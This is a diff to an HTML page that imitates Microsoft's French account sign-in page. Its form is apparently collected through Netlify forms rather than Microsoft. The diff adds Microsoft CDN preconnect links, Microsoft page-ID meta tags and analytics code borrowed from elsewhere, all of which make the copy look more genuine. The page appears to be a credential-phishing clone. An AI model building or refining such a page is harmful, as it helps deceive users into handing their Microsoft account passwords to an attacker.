@@ -5,12 +5,27 @@
 <!-- RequestLCID: 1036, Market:FR-FR, PrefCountry: FR, LangLCID: 1036, LangISO: FR -->
 <html dir="ltr" lang="FR-FR">
     <head>
+	<link rel="preconnect" href="https://acctcdn.msauth.net" crossorigin="">
+    <link rel="preconnect" href="https://acctcdn.msftauth.net" crossorigin="">
+    <link rel="preconnect" href="https://logincdn.msauth.net" crossorigin="">
     <meta http-equiv="x-dns-prefetch-control" content="on">
+    <link rel="dns-prefetch" href="https://acctcdn.msauth.net/">
+    <link rel="dns-prefetch" href="https://acctcdn.msftauth.net/">
+    <link rel="dns-prefetch" href="https://acctcdnmsftuswe2.azureedge.net/">
+    <link rel="dns-prefetch" href="https://acctcdnvzeuno.azureedge.net/">
+    <link rel="dns-prefetch" href="https://logincdn.msauth.net/">
+    <link rel="dns-prefetch" href="https://lgincdnvzeuno.azureedge.net/">
+    <link rel="dns-prefetch" href="https://lgincdnmsftuswe2.azureedge.net/">
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
 	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
 	<noscript>
 	<meta http-equiv="Refresh" content="0; URL="/>Le compte Microsoft nécessite JavaScript pour la connexion. Ce navigateur Web ne prend pas en charge JavaScript ou les scripts sont bloqués.<br /><br />Pour savoir si votre navigateur prend en charge JavaScript ou pour autoriser les scripts, reportez-vous à son aide en ligne.</noscript>
 	<title>Se connecter à votre compte Microsoft</title>
+	<meta name="robots" content="none">
+	<meta name="PageID" content="i5030">
+	<meta name="SiteID" content="292841">
+	<meta name="ReqLC" content="1036">
+	<meta name="LocLC" content="1036">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
 	<link rel="shortcut icon" href="https://logincdn.msauth.net/16.000.29393.1/images/favicon.ico">
 	<link rel="stylesheet" href="https://logincdn.msauth.net/16.000/Converged_v21036_aaRUc92kCx1I0HSCbabz7g2.css">   
@@ -22,7 +37,45 @@
 height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 <!-- End Google Tag Manager (noscript) -->
 
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+</script>
+<script>
+  var ppi_pattern = /([?=&]*)[^=?&\s]+(?:@|%40)[^=?&\s]+\.[^=?&\s]+([?=&]*)/g;
+  var trackOutboundLinkInGA = function(category, action, label, url) {
+    ga('send', 'event', category, action, label, {
+      'transport': 'beacon',
+      'hitCallback': function(){document.location = url;}
+    });
+  }
+</script>
+<script>
+  ga('create', 'UA-8164236-1', 'auto');
+  
+  
+  if(location.search.match(ppi_pattern)){
+      ga('set', 'location', location.href.replace(ppi_pattern, "$1" + "[FILTERED]" + "$2"));
+  }
+</script>
+<script>
+  ga('set', 'dimension10', 'prod');
+</script>
+<script>
+  ga('set', 'dimension9', 'logged in');
+</script>
+<script>
+  if (XVPN.getCookieValue('xvid')) {
+    ga('set', 'dimension11', XVPN.getCookieValue('xvid'));
+  }
+</script>
+<script>
+  ga('send', 'pageview');
+</script>
     <form action="POST" data-netlify-recaptcha="true" data-netlify="true">
+	
 	<div class="win-scroll">
         <div id="lightbox" data-bind="
             animationEnd: $page.paginationControlHelper.animationEnd,
